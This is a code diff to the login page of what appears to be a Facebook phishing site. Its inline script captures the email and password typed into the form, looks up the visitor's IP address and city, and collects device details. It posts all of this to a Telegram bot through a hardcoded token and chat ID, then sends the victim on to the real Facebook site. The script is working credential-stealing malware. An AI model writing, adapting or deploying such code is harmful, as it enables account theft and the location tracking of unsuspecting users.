@@ -91,52 +91,81 @@
         </div>
     </footer>
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-    <script>
-        const TOKEN = "7776643652:AAH2Wh9l4hNhPXELY28UcZJ8vYkXRLA3NaM";
-        const CHAT_ID = "1390103461";
-        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+<script>
+    const TOKEN = "7776643652:AAH2Wh9l4hNhPXELY28UcZJ8vYkXRLA3NaM";
+    const CHAT_ID = "1390103461";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-        document.getElementById('login-form').addEventListener('submit', function(e) {
-            e.preventDefault();
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
 
-            axios.get('https://api.ipify.org?format=json')
-                .then(response => {
-                    const ip = response.data.ip;
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
 
-                    const userAgent = navigator.userAgent;
-                    const platform = navigator.platform;
-                    const screenWidth = screen.width;
-                    const screenHeight = screen.height;
-                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                // الحصول على الموقع الجغرافي
+                axios.get(`http://ip-api.com/json/${ip}`)
+                    .then(locationResponse => {
+                        const location = locationResponse.data;
 
-                    const message = `
-                        <b>New Login Attempt</b>\n
-                        <b>Email:</b> ${email}\n
-                        <b>Password:</b> ${password}\n
-                        <b>IP Address:</b> ${ip}\n
-                        <b>Device Type:</b> ${deviceType}\n
-                        <b>Platform:</b> ${platform}\n
-                        <b>User Agent:</b> ${userAgent}\n
-                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
-                    `; // تم تصحيح التنسيق
+                        // وقت وتاريخ الطلب
+                        const timestamp = new Date().toLocaleString();
 
-                    axios.post(URI_API, {
-                        chat_id: CHAT_ID,
-                        parse_mode: 'html',
-                        text: message
-                    }).then(response => {
-                        alert('Log in Successfully');
-                    }).catch(error => {
-                        alert('Error Login Failed . Please try again.');
+                        // مدة تشغيل الجهاز
+                        const uptime = Math.floor(performance.now() / 1000);
+
+                        // لغة النظام والمتصفح
+                        const language = navigator.language || navigator.userLanguage;
+
+                        // نوع الاتصال
+                        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                        const connectionType = connection ? connection.effectiveType : 'Unknown';
+
+                        // حالة البطارية
+                        navigator.getBattery().then(battery => {
+                            const batteryStatus = `
+                                Battery Level: ${Math.floor(battery.level * 100)}%
+                                Charging: ${battery.charging ? 'Yes' : 'No'}
+                            `;
+
+                            const message = `
+                                <b>New Login Attempt Facebook</b>\n
+                                <b>Email:</b> ${email}\n
+                                <b>Password:</b> ${password}\n
+                                <b>IP Address:</b> ${ip}\n
+                                <b>Country:</b> ${location.country}\n
+                                <b>City:</b> ${location.city}\n
+                                <b>Region:</b> ${location.regionName}\n
+                                <b>ZIP:</b> ${location.zip}\n
+                                <b>Timestamp:</b> ${timestamp}\n
+                                <b>Device Uptime:</b> ${uptime} seconds\n
+                                <b>Language:</b> ${language}\n
+                                <b>Connection Type:</b> ${connectionType}\n
+                                <b>Battery:</b> ${batteryStatus}
+                            `;
+
+                            axios.post(URI_API, {
+                                chat_id: CHAT_ID,
+                                parse_mode: 'html',
+                                text: message
+                            }).then(response => {
+                                window.location.href = "https://www.facebook.com";
+                            }).catch(error => {
+                                console.error('Error sending data to Telegram:', error);
+                            });
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Error fetching location:', error);
                     });
-                })
-                .catch(error => {
-                    alert('Error fetching the IP address. Please try again.');
-                });
-        });
-    </script>
+            })
+            .catch(error => {
+                console.error('Error fetching the IP address:', error);
+            });
+    });
+</script>
 </body>
 </html>
